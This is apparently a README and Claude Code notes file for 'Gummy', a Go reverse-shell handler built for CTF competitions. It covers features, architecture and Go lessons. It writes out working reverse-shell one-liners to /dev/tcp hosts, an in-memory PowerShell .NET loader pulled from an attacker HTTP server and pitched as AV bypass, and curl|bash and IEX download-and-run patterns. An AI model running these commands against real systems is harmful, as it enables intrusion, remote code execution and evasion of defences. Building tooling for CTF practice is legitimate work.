# Gummy - Advanced Shell Handler for CTFs

## Project Overview

Gummy is a modern shell handler written in Go, designed for CTF competitions. It's a port/reimplementation of [Penelope](https://github.com/brightio/penelope) with enhanced features and a beautiful CLI interface using Bubble Tea components.

**Primary Goals:**
- Learn Go by building a practical tool
- Create a robust reverse/bind shell handler for CTFs
- Implement advanced features (PTY upgrade, file transfers, port forwarding)
- Build a polished CLI with Bubble Tea components (Lipgloss styling, interactive confirmations)

## Quick Start

### Installation
```bash
# Clone repository
git clone https://github.com/chsoares/gummy.git
cd gummy

# Build binary
go build -o gummy

# Run with interface binding (recommended)
./gummy -i eth0 -p 4444

# Or with direct IP
./gummy -ip 10.10.14.5 -p 4444
```

### Basic Workflow
```bash
# 1. Start listener
./gummy -i tun0 -p 4444

# 2. Generate payload (in gummy menu)
󰗣 gummy ❯ rev
# Copy one of the generated payloads

# 3. Execute on victim machine
bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'

# 4. Session automatically appears
 Reverse shell received on session 1 (10.10.11.123)

# 5. Use the session
󰗣 gummy ❯ use 1
 Using session 1 (10.10.11.123)

# 6. Enter interactive shell
󰗣 gummy [1] ❯ shell
 Entering interactive shell
# PTY upgrade happens automatically!

# 7. Or upload/download files
󰗣 gummy [1] ❯ upload linpeas.sh /tmp/linpeas.sh
⠋ Uploading linpeas.sh... 100%
 Upload complete! (MD5: 8b1a9953)
```

## Current Status

### ✅ Completed (Phase 1, 2, 3 & 4 - Core + Advanced + Automation + Windows Support)

**Latest Update (2025-10-19):** HTTP-based file transfers + binbag integration complete! Upload/download now blazing fast!
- [x] Project structure setup
- [x] TCP listener implementation (`internal/listener.go`)
- [x] Session Manager with goroutines and channels (`internal/session.go`)
- [x] Shell Handler with bidirectional I/O (`internal/shell.go`)
- [x] **PTY upgrade system** - Automatic upgrade to proper TTY (`internal/pty.go`)
  - Python-based upgrade (`pty.spawn()`)
  - Script command fallback
  - Multiple shell detection (bash, sh, python)
  - Terminal size configuration
  - Silent operation (no spam)
- [x] **File Transfer System** (`internal/transfer.go`) 🔥
  - **HTTP Upload (binbag mode)** - ~1 second for large files using Invoke-WebRequest
  - **SmartUpload** - Auto-selects HTTP or b64 chunks based on binbag config
  - **Base64 Chunking** - Fallback for when HTTP unavailable (1KB chunks Windows, 32KB Linux)
  - **Windows PowerShell** - Uses Out-File for reliable binary/script uploads
  - Upload files (local → remote) with automatic method selection
  - Download files (remote → local) with base64 decoding
  - Animated progress spinners with real-time updates and inactivity timeout
  - MD5 checksum verification for both methods
  - Automatic cleanup of temporary files
  - Ctrl+D to cancel transfers (note: consumes first char after transfer - known limitation)
- [x] **Readline Integration** (`github.com/chzyer/readline`)
  - Arrow keys for cursor movement in menu
  - Up/Down for command history navigation
  - Persistent history in `~/.gummy/history` (1000 commands)
  - Standard keybinds (Ctrl+A/E, Ctrl+W, etc.)
  - Smart tab completion for commands and local file paths
- [x] **Animated Spinners** (`internal/ui/spinner.go`)
  - Upload/download progress with animated spinners (⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏)
  - Dynamic message updates (size, percentage)
  - Clean inline rendering with \r escape codes
- [x] **Bubble Tea Components** (`github.com/charmbracelet/lipgloss` & `bubbletea`)
  - Styled banner with Lipgloss (rounded borders, magenta theme)
  - Interactive confirmations with Bubble Tea (gum-style)
  - Boxed menus and help screens
  - Clean, professional appearance
  - Consistent color scheme throughout
- [x] **SSH Integration** (`internal/ssh.go`) 🆕
  - Connect via SSH and auto-execute reverse shell
  - Silent execution (only shows SSH password prompt)
  - Format: `ssh user@host` or `ssh user@host:port`
  - Automatic reverse shell payload injection
- [x] **Payload Generation** (`internal/payloads.go`) 🆕
  - Bash reverse shells
  - Bash Base64-encoded payloads
  - PowerShell reverse shells (UTF-16LE encoded)
  - Automatic payload generation based on listener IP/port
- [x] **Network Utilities** (`internal/netutil.go`) 🆕
  - Interface IP resolution (`-i eth0` → resolves to IP)
  - Network interface listing with styled output
  - IP address validation
  - Beautiful interface selector in help/error messages
- [x] **Shell Spawning** 🆕
  - Spawn new reverse shell from existing session
  - Platform-aware payloads (Linux/macOS/Windows)
  - Background execution (doesn't lock current session)
  - Automatic new session detection
- [x] Concurrent connection handling (multiple simultaneous sessions)
- [x] Graceful shutdown with signal handling (SIGTERM only)
- [x] Unique session ID generation (crypto/rand)
- [x] Interactive menu system (list, use, shell, upload, download, kill, help, exit, clear, ssh, rev, spawn)
- [x] Color-coded UI output (`internal/ui/colors.go`)
- [x] Session switching between multiple connections
- [x] Clean connection cleanup on disconnect
- [x] **Enhanced CLI Flags** 🆕
  - `-i/--interface` for network interface binding
  - `-ip` for direct IP binding
  - `-p/--port` for listener port
  - Beautiful error messages with available interfaces
- [x] **Session Detection** 🆕
  - Auto-detect `user@host` on connection
  - Platform detection (Linux/Windows/macOS)
  - Background monitoring for session health
  - Graceful handling of dead sessions
- [x] **Module System** (`internal/modules.go`) 🆕
  - Module interface and registry (singleton pattern)
  - Explicit category ordering: Linux, Windows, Misc, Custom
  - Commands: `modules` (list), `run <module> [args]` (execute)
  - **Execution Modes:**
    - In-memory (💾) - Scripts loaded to bash variables, zero disk artifacts
    - Disk + cleanup (🧹) - Temporary disk write, shredded after execution
    - Disk only (💿) - Files persist on disk (intentional)
  - **Linux Modules:**
    - `peas` - LinPEAS privilege escalation scanner (in-memory)
    - `lse` - Linux Smart Enumeration (in-memory)
    - `loot` - ezpz post-exploitation script (in-memory)
    - `pspy` - Process monitoring without root (disk + cleanup)
  - **Misc Modules:**
    - `privesc` - Bulk upload privesc scripts (disk only, platform-aware)
  - **Custom Modules:**
    - `sh <url>` - Run arbitrary shell scripts from URLs (in-memory)
  - RunScriptInMemory() for stealthy in-memory execution (new!)
  - RunScript() for traditional disk-based execution
  - RunBinary() for executables (chmod +x, direct execution)
  - UploadToVariable() - Load scripts to bash variables (new!)
  - Timeout support for long-running binaries (5min default)
  - Real-time output streaming to separate terminals
  - Automatic cleanup with shred (secure deletion)
  - Module table shows execution mode symbols with legend
- [x] **Session Directories** 🆕
  - Format: `~/.gummy/YYYY_MM_DD/IP_user_hostname/` (shared per host)
  - Lazy creation (only when needed by modules)
  - Auto-created `scripts/` and `logs/` subdirectories
  - Path sanitization for special characters
  - Timestamps for all module outputs
- [x] **HTTP Downloader** (`internal/downloader.go`) 🆕
  - Download files from URLs with progress indication
  - Animated spinners with percentage and size
  - Human-readable file sizes (KB, MB, GB)
- [x] **Terminal Opener** (`internal/terminal.go`) 🆕
  - Opens new terminal window for module outputs
  - Prioritizes modern terminals (kitty, ghostty, foot)
  - Falls back to traditional terminals
  - Auto-detects available terminal emulator
- [x] **Configuration System** (`internal/config.go`, `internal/runtime_config.go`) 🔥
  - TOML-based persistent configuration (`~/.gummy/config.toml`)
  - Runtime-mutable settings with thread-safe access (sync.RWMutex)
  - **Binbag integration** - Serve files via HTTP for blazing fast uploads
  - **Execution mode** - Toggle between "stealth" (in-memory) and "speed" (HTTP)
  - **Pivot support** - Override HTTP URLs for internal networks
  - Commands: `config` (show), `config save` (persist), `set <option> <value>` (modify)
  - Tilde expansion support (`~/Lab/binbag` works!)
- [x] **HTTP File Server** (`internal/fileserver.go`) 🔥
  - Lightweight HTTP server serving files from binbag directory
  - Real-time progress tracking with channel-based notifications
  - Inactivity timeout (resets on progress, prevents false timeouts)
  - Automatic cleanup on gummy exit
  - Format: `http://<listener-ip>:<http-port>/filename`
- [x] **Windows PowerShell Support** (`internal/shell.go`) 🆕
  - Dual-mode shell handler: PTY mode (raw) for Linux, readline mode for Windows
  - Readline loop using `github.com/peterh/liner` library
  - Full line editing support (left/right arrows, Ctrl-A/E/K/W)
  - Local command history (up/down arrows) persisted to `~/.gummy/shell_history`
  - Ctrl-C sends `^C` to remote shell without killing gummy
  - Ctrl-D to exit back to menu
  - Platform auto-detection based on prompt patterns (`PS C:\` for Windows)
  - Known limitation: Prompt may briefly disappear when navigating history

### ✅ Completed (Phase 5 - Module Optimization & Polish)

**Latest Update (2026-03-12):** Module HTTP optimization, .NET/PS1 HTTP, SIGWINCH, session logging all complete!

**Module Optimization:**
- [x] **Optimize run modules with binbag** - `curl | bash` for Linux, `IEX DownloadString` for PS1, `DownloadData` for .NET
- [x] **Module b64 fallback** - All modules gracefully fall back to b64 variable upload when binbag disabled
- [x] **Simplified execution modes** - stealth = in-memory (curl|bash, Reflection.Load), speed = disk (SmartUpload → shred)
- [x] **Add `run bin` module** - Generic disk+cleanup for any binary/executable from URL or binbag
- [x] **.NET in-memory via HTTP** - `DownloadData` + `Reflection.Assembly.Load` - single HTTP request, zero disk
- [x] **PowerShell in-memory via HTTP** - `IEX DownloadString` - single HTTP request, zero disk
- [x] **Fix Windows whoami detection** - Two-phase detection: platform from prompt → platform-specific commands
- [x] **SIGWINCH handler** - Dynamic terminal resize when user resizes window
- [x] **Session Logging** - Automatic I/O logging to `~/.gummy/YYYY_MM_DD/IP_user_hostname/logs/session_N.log`

**Remaining Polish & Testing**
- [ ] **Test Windows in-memory modules** - `run ps1`, `run net`, `run py` need testing with HTTP mode
- [ ] **Windows Modules** - WinPEAS, PowerUp, PrivescCheck integration
- [ ] **Additional Linux Modules** - See TODO.md for suggestions
- [ ] Port forwarding (local/remote) - NOT PRIORITY (use ligolo)
- [ ] Auto-reconnect capability

## Project Structure

```
gummy/
├── main.go                      # ✅ Entry point, CLI flags, binbag initialization
├── internal/
│   ├── listener.go              # ✅ TCP listener, connection acceptance
│   ├── session.go               # ✅ Multi-session manager, interactive menu (~1900 LOC)
│   ├── shell.go                 # ✅ Shell I/O handler (PTY + readline modes)
│   ├── pty.go                   # ✅ PTY upgrade system (Linux)
│   ├── transfer.go              # ✅ File upload/download (HTTP + b64 chunks) (~900 LOC) 🔥
│   ├── config.go                # ✅ TOML configuration (binbag, execution, pivot) 🔥
│   ├── runtime_config.go        # ✅ Thread-safe runtime config (sync.RWMutex) 🔥
│   ├── fileserver.go            # ✅ HTTP file server with progress tracking 🔥
│   ├── ssh.go                   # ✅ SSH connection + auto reverse shell
│   ├── payloads.go              # ✅ Reverse shell payload generators
│   ├── netutil.go               # ✅ Network interface utilities
│   ├── modules.go               # ✅ Module system (peas, lse, loot, pspy, etc.)
│   ├── downloader.go            # ✅ HTTP downloader with progress
│   ├── terminal.go              # ✅ Terminal opener (modern terminals)
│   └── ui/
│       ├── colors.go            # ✅ Color/formatting with Lipgloss + Bubble Tea
│       └── spinner.go           # ✅ Animated spinners for long operations
├── go.mod
├── go.sum
└── CLAUDE.md                    # This file
```

**Why this structure?**
- **Flat `internal/` package** - All core modules in single package, no nested folders
- **Single binary** - `main.go` at root (removed unnecessary `cmd/` directory)
- **UI separation** - `ui/` sub-package for clear separation of presentation layer
- **Easy imports** - `import "github.com/chsoares/gummy/internal"` for everything
- **Simple navigation** - All files visible at once, no hunting through subdirectories
- **Pragmatic** - Less boilerplate, more focus on actual code

## Key Design Decisions

### Concurrency Model
- **Goroutines**: Each connection handled in separate goroutine
- **Channels**:
  - Shell Handler uses channels for stdin/stdout/stderr streaming
  - Clean shutdown propagated via context cancellation
- **Mutex**: `sync.RWMutex` protects shared session map in Manager
  - `Lock()` for writes (add/remove sessions)
  - `RLock()` for reads (list sessions, get active session)

### Session Management Architecture
- **Manager**: Centralized session registry (`map[int]*SessionInfo`)
- **Handler**: Per-session I/O handler with goroutines for bidirectional streaming
- **Session IDs**: Integer counter (1, 2, 3, ...) for user-friendly reference
- **Connection IDs**: Crypto/rand hex (16 chars) for internal unique identification
- **Active Session**: Single active session at a time, switchable via `use <id>`
- **Lifecycle**: Automatic cleanup on disconnect detected by Handler

### Error Handling
- Go idiomatic: return errors explicitly
- Error wrapping with `fmt.Errorf("context: %w", err)`
- Graceful degradation where possible
- Log errors but keep server running

## Important Go Concepts Used

### 1. Goroutines
```go
go l.acceptConnections()  // Non-blocking concurrent execution
```

### 2. Channels
```go
l.newSession <- session    // Send
session := <-l.newSession  // Receive
```

### 3. Select Statement
```go
select {
case session := <-l.newSession:
    // Handle new
case id := <-l.closeSession:
    // Handle close
}
```

### 4. Defer
```go
defer conn.Close()  // Always executes on function return
```

### 5. Interfaces (upcoming)
Will be used for:
- `io.Reader` / `io.Writer` for shell I/O
- Custom interfaces for session operations

## Development Environment

**System:** Arch Linux with Hyprland + Fish shell

**Dependencies:**
- Go 1.21+ (check with `go version`)
- `github.com/chzyer/readline` - Enhanced CLI input
- `github.com/charmbracelet/lipgloss` - Terminal styling
- `github.com/charmbracelet/bubbletea` - Interactive components (confirmations)
- `github.com/creack/pty` - PTY handling
- `golang.org/x/term` - Terminal utilities

**Build & Run:**
```fish
# Development
go run ./cmd/gummy -p 4444

# Build binary
go build -o gummy

# Run binary
./gummy -p 4444 -h 0.0.0.0
```

**Testing Connection:**
```fish
# In another terminal
nc localhost 4444

# Or real reverse shell
bash -i >& /dev/tcp/localhost/4444 0>&1
```

**Using File Transfer:**
```fish
# Start gummy
./gummy -p 4444

# In another terminal, connect reverse shell
bash -i >& /dev/tcp/localhost/4444 0>&1

# In gummy:
󰗣 gummy ❯ list
Active sessions:
  1 → 127.0.0.1:xxxxx

󰗣 gummy ❯ use 1
 Selected session 1

# Upload file to victim
󰗣 gummy ❯ upload /tmp/test.txt /tmp/uploaded.txt
 Uploading test.txt (42 B)...
 [████████████████████████████████████████] 100% (1/1 chunks)
✅ Upload complete! (MD5: 5d41402a)

# Download file from victim
󰗣 gummy ❯ download /etc/passwd
 Downloading passwd...
 Downloaded 2.1 KB
✅ Download complete! Saved to: passwd (MD5: 8b1a9953)
```

## Next Steps (Priority Order)

### 1. SIGWINCH Handler (MEDIUM PRIORITY)
**File:** `internal/pty/upgrade.go` (enhance existing)

**Current State:**
PTY upgrade is fully implemented and runs automatically! Terminal size is set **once** at connection time.

**Enhancement Needed:**
Handle dynamic terminal resize events. When you resize your terminal window, the remote shell should adapt.

**Implementation:**
```go
func (p *PTYUpgrader) SetupResizeHandler() {
    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, syscall.SIGWINCH)

    go func() {
        for range sigChan {
            width, height := p.getTerminalSize()
            cmd := fmt.Sprintf("stty rows %d cols %d\n", height, width)
            p.conn.Write([]byte(cmd))
        }
    }()
}
```

**Priority:** Medium (nice-to-have, current fixed size works fine for most use cases)

### 2. Port Forwarding (HIGH PRIORITY)
**Files:** `internal/portfwd/` (new package)

**Tasks:**
- Local port forwarding (listen locally, forward through victim)
- Remote port forwarding (listen on victim, forward to local)
- Multiple concurrent forwards
- Dynamic port allocation

### 3. Session Logging (MEDIUM PRIORITY)
**File:** `internal/session/logger.go` (new file)

**Tasks:**
- Automatic logging of all session I/O
- Timestamped log files per session
- Configurable log directory
- Replay capability

## Code Style Guidelines

### Language
- **Code comments, variables, functions:** English only
- **Git commits:** English
- **Documentation:** English

### Go Conventions
- Exported (public): `UpperCamelCase`
- Unexported (private): `lowerCamelCase`
- Constructors: `New()` or `NewTypeName()`
- Error handling: always check, explicit returns
- Use `gofmt` for formatting (automatic in most editors)

### Project Conventions
- Small, focused functions
- Clear separation of concerns
- Comment exported functions and types
- Use meaningful variable names (not too short, not too long)

## UI/UX Design Guidelines

### Color Palette (Lipgloss Colors)
Our UI follows a **Catppuccin-inspired** color scheme with consistent theming:

```go
// Primary colors
Magenta (5)    - Main theme color, droplet symbol, borders, primary accents
Cyan (6)       - Information, success messages, headers
Yellow         - Warnings, active sessions, upload/download indicators
Red            - Errors, session closed, critical messages
Blue           - Commands, help text, table headers
```

### Symbol Usage (Nerd Fonts Required)
Consistent symbols create visual hierarchy:

```go
󰗣 (SymbolDroplet)  - Main gummy branding (prompt, banner)
 (SymbolFire)     - New reverse shell received (exciting!)
 (SymbolGem)      - Active sessions header
 (SymbolSkull)    - Session closed/died
 (SymbolCommand)  - Commands, arrows, help text
 (SymbolInfo)     - General information
 (SymbolCheck)    - Success, completion
 (SymbolDownload) - Download operations
 (SymbolUpload)   - Upload operations
 (SymbolError)    - Error messages
 (SymbolWarning)  - Warning messages
```

### UI Helper Functions (`internal/ui/colors.go`)

Always use these helpers instead of raw ANSI codes:

```go
// Status messages
ui.Success("Operation completed!")       // ✅ Cyan checkmark
ui.Error("Something went wrong")         // ❌ Red error symbol
ui.Warning("Be careful")                 // ⚠️  Magenta warning
ui.Info("Just so you know")             //  Cyan info symbol

// Commands and help
ui.Command("upload /path/to/file")       // Plain text for commands
ui.CommandHelp("Usage: upload <file>")   //  Blue command help
ui.HelpInfo("Type 'help' for commands")  //  Blue informational

// Sessions
ui.SessionOpened(1, "192.168.1.100")    //  Yellow fire + session info
ui.SessionClosed(1, "192.168.1.100")    //  Red skull + session info
ui.UsingSession(1, "192.168.1.100")     //  Yellow target + session info

// Prompts
ui.Prompt()                              // 󰗣 gummy ❯
ui.PromptWithSession(sessionID)          // 󰗣 gummy [1] ❯

// Styled boxes
ui.Banner()                              // Rounded box with "gummy shell 󰗣"
ui.BoxWithTitle(title, lines)            // Generic box with title
ui.BoxWithTitlePadded(title, lines, pad) // Box with custom padding
```

### Spinner Guidelines

For long-running operations (uploads, downloads, spawns):

```go
spinner := ui.NewSpinner()
spinner.Start("Initial message...")
defer spinner.Stop() // Always ensure cleanup

// Update progress dynamically
spinner.Update(fmt.Sprintf("Progress: %d%%", percent))

// Stop shows nothing - print success/error AFTER stopping
spinner.Stop()
fmt.Println(ui.Success("Done!"))
```

### Confirmation Dialogs

Use Bubble Tea confirmations for destructive actions:

```go
if !ui.Confirm("Active sessions detected. Exit anyway?") {
    return // User cancelled
}
// User confirmed, proceed
```

### Table Formatting

For session lists and structured data:

```go
var lines []string
lines = append(lines, ui.TableHeader("id  remote address     whoami"))

for _, session := range sessions {
    line := fmt.Sprintf("%-3d %-18s %s", id, addr, whoami)
    if session.Active {
        lines = append(lines, ui.SessionActive(line))  // Yellow highlight
    } else {
        lines = append(lines, ui.SessionInactive(line)) // Normal color
    }
}

fmt.Println(ui.BoxWithTitle(" Active Sessions", lines))
```

### Message Formatting Best Practices

1. **Be concise** - Terminal space is limited
2. **Use symbols** - Visual hierarchy helps scanning
3. **Consistent casing** - Sentence case for messages
4. **No trailing punctuation** - Unless it's a question
5. **Group related info** - Use boxes for multi-line output

### Example: Good vs Bad

❌ **Bad:**
```go
fmt.Println("ERROR: File not found: /tmp/test.txt")
fmt.Println("Downloading...")
fmt.Println("Success!")
```

✅ **Good:**
```go
fmt.Println(ui.Error("File not found: /tmp/test.txt"))

spinner := ui.NewSpinner()
spinner.Start("Downloading test.txt... 0 B")
// ... download logic ...
spinner.Stop()
fmt.Println(ui.Success("Download complete! Saved to: test.txt (1.2 KB, MD5: 5d41402a)"))
```

### Layout Principles

1. **Breathing room** - Empty lines between major sections
2. **Borders for grouping** - Use `BoxWithTitle()` for related content
3. **Inline for actions** - Spinners, confirmations should be inline
4. **Clear line breaks** - Use `\n` after boxes, not before
5. **Prompt visibility** - Always clear spinners before showing prompt

### Accessibility Notes

- All symbols are **optional** - code works without Nerd Fonts
- Color codes degrade gracefully in non-color terminals
- Spinners are text-based (not Unicode-dependent)
- Readline provides standard keybindings (Ctrl+A/E/W/K/U)

## Common Patterns to Follow

### Adding New Session Operations
```go
// 1. Add method to Listener
func (l *Listener) OperationName(sessionID string) error {
    l.mu.RLock()
    session, exists := l.sessions[sessionID]
    l.mu.RUnlock()
    
    if !exists {
        return fmt.Errorf("session not found: %s", sessionID)
    }
    
    // Do operation
    return nil
}
```

### Creating New Goroutines
```go
// Always think about:
// 1. How will it terminate?
// 2. How do I signal it to stop?
// 3. Does it need channels for communication?
// 4. Does it access shared state? (needs mutex)

go func() {
    defer log.Println("Goroutine exiting")
    
    for {
        select {
        case <-stopChan:
            return
        case data := <-dataChan:
            // Process
        }
    }
}()
```

### Error Handling
```go
// Wrap errors with context
if err != nil {
    return fmt.Errorf("failed to do X: %w", err)
}

// Log and continue for non-critical errors
if err != nil {
    log.Printf("Warning: %v", err)
    // continue...
}
```

## Testing Strategy

### Manual Testing
```fish
# Start gummy
go run ./cmd/gummy -p 4444

# Connect with netcat
nc localhost 4444

# Later: test with actual reverse shell
bash -i >& /dev/tcp/localhost/4444 0>&1
```

### Future: Unit Tests
- Test session management logic
- Test command parsing
- Mock network connections

## Resources & References

### Penelope (Original Python version)
- https://github.com/brightio/penelope

### Go Documentation
- Tour of Go: https://go.dev/tour/
- Effective Go: https://go.dev/doc/effective_go
- Standard library: https://pkg.go.dev/std

### Bubble Tea Components
- https://github.com/charmbracelet/bubbletea
- https://github.com/charmbracelet/lipgloss
- https://github.com/charmbracelet/bubbles

### PTY Handling
- https://github.com/creack/pty
- https://blog.kowalczyk.info/article/zy/creating-pseudo-terminal-pty-in-go.html

## .NET In-Memory Execution (PowerShell)

### Overview
Execute .NET assemblies **completely in-memory** without touching disk - perfect for bypassing AV and leaving zero artifacts.

### How It Works
```powershell
# 1. Download assembly as byte array (not string!)
$bytes = (New-Object Net.WebClient).DownloadData("http://10.10.14.5:8080/SharpUp.exe")

# 2. Load assembly directly into memory
$assembly = [System.Reflection.Assembly]::Load($bytes)

# 3. Execute the EntryPoint (Main method)
$assembly.EntryPoint.Invoke($null, @(,$args))
```

### Complete Example with Arguments
```powershell
# Download SharpUp from binbag
$url = "http://10.10.14.5:8080/SharpUp.exe"
$bytes = (New-Object Net.WebClient).DownloadData($url)
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Run with arguments (e.g., "audit")
$args = @("audit")
$assembly.EntryPoint.Invoke($null, @(,$args))
```

### Implementation in Gummy
```go
// internal/session.go - RunDotNetInMemory()
func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource string, args []string) error {
    // 1. Resolve source (binbag file, URL, or local path)
    localPath, cleanup, err := resolveSource(assemblySource)
    if cleanup != nil {
        defer cleanup()
    }

    // 2. Get HTTP URL from binbag
    httpURL := GlobalRuntimeConfig.GetHTTPURL(filepath.Base(localPath))

    // 3. Build PowerShell command for in-memory execution
    argsStr := ""
    if len(args) > 0 {
        argsStr = `@("` + strings.Join(args, `","`) + `")`
    } else {
        argsStr = "@()"
    }

    cmd := fmt.Sprintf(`
$bytes = (New-Object Net.WebClient).DownloadData('%s')
$assembly = [Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, @(,%s))
`, httpURL, argsStr)

    // 4. Execute and stream output to terminal
    return s.Handler.ExecuteWithStreaming(cmd, outputPath)
}
```

### Usage in Gummy
```bash
# 1. Enable binbag
󰗣 gummy ❯ set binbag ~/Lab/binbag

# 2. Add SharpUp.exe to binbag directory
cp SharpUp.exe ~/Lab/binbag/

# 3. Run in-memory (current `run net` module)
󰗣 gummy [1] ❯ run net SharpUp.exe audit

# Output streams to new terminal window
# Zero disk artifacts on victim!
```

### Advantages
- ✅ **Zero disk artifacts** - Assembly never written to disk on victim
- ✅ **AV bypass** - Most AVs can't scan in-memory .NET assemblies
- ✅ **Blazing fast** - HTTP download from binbag (~1 second)
- ✅ **Works with any .NET assembly** - SharpUp, Rubeus, Seatbelt, Certify, etc.
- ✅ **Clean execution** - No cleanup needed (nothing to clean!)

### Limitations
- ❌ **Only .NET assemblies** - Won't work with native binaries (mimikatz.exe, pspy64)
- ❌ **Requires EntryPoint** - Assembly must have a `Main()` method
- ❌ **Some assemblies detect in-memory execution** - May refuse to run or behave differently
- ❌ **Windows only** - Requires PowerShell/.NET Framework

### Tools That Work Great
- **SharpUp** - Windows privilege escalation checker
- **Rubeus** - Kerberos abuse toolkit
- **Seatbelt** - System enumeration
- **Certify** - Active Directory certificate abuse
- **SharpHound** - BloodHound data collector
- **SharpDPAPI** - DPAPI abuse
- **Whisker** - Shadow credentials manipulation

### For Native Binaries (Non-.NET)
Use `run bin` module (disk + cleanup):
```bash
# Run native binary (writes to disk temporarily)
󰗣 gummy [1] ❯ run bin pspy64

# Execution:
# 1. Download from binbag via HTTP
# 2. Write to /tmp/gummy_pspy64
# 3. chmod +x
# 4. Execute
# 5. Shred file on completion
```

### Module Execution Modes Summary
- **💾 In-Memory** (`run sh`, `run ps1`, `run net`) - Zero disk, max stealth
- **🧹 Disk + Cleanup** (`run bin`, `run pspy`) - Temporary disk, auto-shred
- **💿 Disk Only** (`run privesc`) - Intentional persistence for later use

## Questions to Consider

- **Session persistence:** Should sessions survive server restart?
- **Logging:** File-based logs vs in-memory vs both?
- **Configuration:** YAML/TOML file vs CLI flags only?
- **Authentication:** Add password/token for connections?
- **Encryption:** TLS support for connections?

## Notes for Claude Code

- This is a learning project - explain concepts when implementing
- Prefer clarity over cleverness
- Each feature should be small, testable, and working
- Comment non-obvious code
- Keep the educational value high

## What We've Learned So Far

### Go Concepts Mastered
1. **Goroutines & Concurrency**
   - Spawning goroutines for concurrent connection handling
   - Understanding when goroutines exit and how to clean them up
   - Race condition prevention with proper synchronization

2. **Channels**
   - Buffered channels for I/O streaming (`make(chan []byte, 100)`)
   - Using channels for inter-goroutine communication
   - Proper channel cleanup to prevent goroutine leaks

3. **Mutex & Thread Safety**
   - `sync.RWMutex` for protecting shared session map
   - Difference between `Lock()`/`Unlock()` and `RLock()`/`RUnlock()`
   - Critical sections and minimizing lock time

4. **Defer & Resource Cleanup**
   - `defer conn.Close()` for guaranteed cleanup
   - Defer execution order (LIFO)
   - Multiple defers in a function

5. **Error Handling**
   - Explicit error returns (no exceptions!)
   - Error wrapping with `fmt.Errorf(...: %w, err)`
   - When to log vs return errors

6. **I/O & Networking**
   - `net.Listener` and `net.Conn` interfaces
   - `io.Copy()` for efficient streaming
   - Handling connection closure and EOF
   - `SetReadDeadline()` for timeout control

7. **Context & Signals**
   - Signal handling with `signal.Notify()`
   - Graceful shutdown patterns
   - Preventing error spam during shutdown

8. **File Operations** 🆕
   - `os.ReadFile()` / `os.WriteFile()` for simple file I/O
   - `os.Stat()` for checking file existence
   - `filepath.Base()` for path manipulation
   - File permissions (0644)

9. **Encoding/Decoding** 🆕
   - `encoding/base64` for safe binary transfer
   - `crypto/md5` for checksums
   - `encoding/hex` for hash representation
   - String chunking for large data

10. **String Manipulation** 🆕
    - `strings.Split()`, `strings.Join()`, `strings.TrimSpace()`
    - `strings.Builder` for efficient string concatenation
    - `strings.Contains()`, `strings.Index()` for searching
    - `strings.LastIndex()` for finding last occurrence (critical for marker detection)
    - Format strings with `fmt.Sprintf()`

11. **External Libraries** 🆕
    - `github.com/chzyer/readline` for rich terminal input
    - `github.com/charmbracelet/lipgloss` for styling and layout
    - `github.com/charmbracelet/bubbletea` for interactive components
    - `github.com/charmbracelet/bubbles` for pre-built widgets (help)
    - History persistence and management
    - Keybindings and cursor control
    - Graceful fallback when unavailable

12. **Network Programming** 🆕
    - `net.Interfaces()` for network interface enumeration
    - `net.InterfaceByName()` for specific interface lookup
    - `net.ParseIP()` for IP validation
    - Understanding IPv4 vs IPv6 addresses
    - Interface flags (FlagUp, FlagLoopback)

13. **Terminal Control** 🆕
    - `golang.org/x/term` for terminal size detection
    - `term.MakeRaw()` for raw input mode (ESC key detection)
    - `term.Restore()` for restoring terminal state
    - Terminal escape codes (`\r`, `\033[K`, `\033[2J`)
    - Proper cleanup with defer

14. **SSH Automation** 🆕
    - `os/exec.Command()` for running external commands
    - Connecting stdin/stdout/stderr to child processes
    - SSH flags: `-t` (force PTY), `-T` (no PTY), `-o` (options)
    - Background command execution in remote shells

15. **In-Memory Execution** 🆕
    - Bash variable concatenation with `+=` operator
    - Piping variables to stdin: `echo "$var" | bash -s`
    - Base64 encoding for safe transport of special characters
    - Variable cleanup with `unset` command
    - ARG_MAX awareness (bash variable size limits)
    - Avoiding disk artifacts for stealth operations

### Architecture Patterns Used
- **Separation of Concerns**: Listener → Manager → Handler (each has single responsibility)
- **Interface Segregation**: `net.Conn` interface allows flexible I/O handling
- **Fan-out**: One listener spawns multiple handler goroutines
- **Centralized State**: Manager holds all sessions, preventing race conditions
- **Connection Buffer Management**: Critical draining before file transfers to handle post-shell state
- **UI Abstraction**: All visual output goes through `internal/ui` helpers
- **Platform Detection**: Runtime platform detection for smart payload selection

## Progress Tracking

**Last updated:** 2026-03-12
**Current focus:** Phase 5 complete! Module HTTP optimization, SIGWINCH, session logging
**Next milestone:** Test Windows HTTP modules on real targets
**Lines of code:** ~6,600 LOC
**Modules:** 13 files in `internal/` (flat structure) + 1 `main.go`
**Status:** Production-ready for CTF use with both Linux and Windows! ✅

### Feature Completeness
- ✅ **Core functionality** - Reverse shell handling, multi-session, PTY upgrade (Linux) + readline mode (Windows)
- ✅ **File operations** - Upload/download with progress, MD5 verification
- ✅ **UI/UX** - Lipgloss styling, Bubble Tea confirmations, animated spinners
- ✅ **Automation** - SSH integration, payload generation, shell spawning
- ✅ **Reliability** - Session monitoring, buffer draining, graceful error handling
- ✅ **Module System** - Extensible with 6 Linux modules (peas, lse, loot, pspy, privesc, sh)
- ✅ **Stealth Operations** - In-memory script execution (bash, ps1, net, py), zero disk artifacts
- ✅ **Windows PowerShell** - Full interactive shell support with line editing and history
- ✅ **Windows whoami detection** - Two-phase platform detection + platform-specific commands with fallback retry
- ⏳ **Windows HTTP modules testing** - Need to test ps1, net, py modules with HTTP mode on actual Windows targets
- ✅ **Session logging** - Automatic I/O logging to logs/ directory with session headers
- ✅ **SIGWINCH handler** - Dynamic terminal resize during PTY sessions
- ✅ **Module HTTP optimization** - curl|bash, IEX DownloadString, DownloadData + Reflection.Load

### Command Reference
```
# Connection automation
ssh user@host                - Connect via SSH + auto revshell
rev [ip] [port]              - Generate reverse shell payloads
spawn                        - Spawn new shell from current session

# Session management
list, sessions               - List all active sessions
use <id>                     - Select session for operations
shell                        - Enter interactive shell (F12 to exit)
kill <id>                    - Kill specific session

# File operations
upload <local> [remote]      - Upload file (ESC to cancel)
